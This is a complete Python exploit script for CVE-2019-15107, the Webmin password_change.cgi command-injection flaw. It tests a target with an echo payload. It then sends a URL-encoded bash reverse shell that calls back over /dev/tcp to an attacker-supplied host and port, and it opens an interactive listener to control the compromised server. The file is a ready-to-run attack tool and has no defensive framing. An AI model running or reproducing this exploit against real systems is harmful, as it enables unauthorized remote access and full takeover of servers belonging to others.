#!/bin/python3

import os
import sys
import select
import socket
import argparse
import threading
import subprocess
from rich.console import Console

color = Console()
vuln_path = "/password_change.cgi"

def check_vuln_response(target):
    base_target = target.rstrip('/')
    if ":10000" not in base_target and ":" not in base_target[6:]:
        base_target = f"{base_target}:10000"

    test_vuln = (
        f"curl --connect-timeout 5 -sk -X POST '{base_target}{vuln_path}' "
        "-H 'User-Agent: Mozilla/5.0' "
        f"-H 'Referer: {base_target}/' "
        "-H 'Content-Type: application/x-www-form-urlencoded' "
        "-d 'expired=echo%20iJCHlHgMNOcxKwMIjhKXUYEaZMKM&new1=iJCHlHgMNOcxKwMIjhKXUYEaZMKM&new2=iJCHlHgMNOcxKwMIjhKXUYEaZMKM&old=echo%20iJCHlHgMNOcxKwMIjhKXUYEaZMKM'"
    )
    try:
        send_test = subprocess.run(test_vuln, shell=True, capture_output=True, text=True)
        return send_test.stdout
    except Exception:
        return ""

def trigger_exploit(target, lhost, lport):
    base_target = target.rstrip('/')
    if ":10000" not in base_target and ":" not in base_target[6:]:
        base_target = f"{base_target}:10000"

    exploit_target = (
        f"curl -sk -X POST '{base_target}{vuln_path}' "
        "-H 'User-Agent: Mozilla/5.0' "
        f"-H 'Referer: {base_target}/' "
        "-H 'Content-Type: application/x-www-form-urlencoded' "
        f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=123&new2=123&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
    )
    try:
        subprocess.run(exploit_target, shell=True, capture_output=True, text=True, timeout=10)
    except subprocess.TimeoutExpired:
        pass  # Timeout is expected when shell connects

def detect_CVE_2019_15107(target, lhost, lport):
    color.print("[blue][*][/blue] Checking if the target is vulnerable")
    vuln_response = check_vuln_response(target)
    if "iJCHlHgMNOcxKwMIjhKXUYEaZMKM" in vuln_response:
        color.print("[green][+][/green] Target is vulnerable")
        color.print(f"[blue][*][/blue] Launching exploit against: [cyan]{target}[/cyan]")
        
        # 1. Start the interactive listener first in the main thread loop
        # 2. Fire the exploit request via background thread after a brief pause
        threading.Timer(1.0, trigger_exploit, args=(target, lhost, lport)).start()
        start_listener(lhost, int(lport))
    else:
        color.print("[red][~][/red] Target is not vulnerable")
        sys.exit()

def start_listener(lhost, lport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket = None
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", lport)) # Fixed hardcoded bug
        server_socket.listen(1)
        color.print(f"[blue][*][/blue] Listening for incoming shell on {lhost}:{lport}...")

        server_socket.settimeout(15)
        client_socket, addr = server_socket.accept()
        color.print(f"[green][+][/green] Connection received from {addr[0]}:{addr[1]}")

        client_socket.setblocking(0)
        color.print("[bold green][+] Command shell opened successfully! Type commands below:[/bold green]\n")

        # Keep interactive prompt running cleanly
        while True:
            ready, _, _ = select.select([client_socket, sys.stdin], [], [])
            
            if client_socket in ready:
                data = client_socket.recv(4096)
                if not data:
                    color.print("\n[red][!][/red] Shell connection closed by remote host.")
                    break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
                
            if sys.stdin in ready:
                command = sys.stdin.readline()
                if not command:
                    break
                client_socket.sendall(command.encode())
                
    except socket.timeout:
        color.print("[red][!][/red] Exploit timed out. No connection back received.")
    except KeyboardInterrupt:
        color.print("\n[red][!][/red] Closing session.")
    finally:
        if client_socket:
            client_socket.close()
        server_socket.close()

def main():
    parser = argparse.ArgumentParser(description="Fixed Webmin RCE Exploit")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--lhost", required=True, help="Local host IP")
    parser.add_argument("--lport", required=True, help="Local port")
    args = parser.parse_args()
    detect_CVE_2019_15107(args.url, args.lhost, args.lport)

if __name__ == "__main__":
    main()


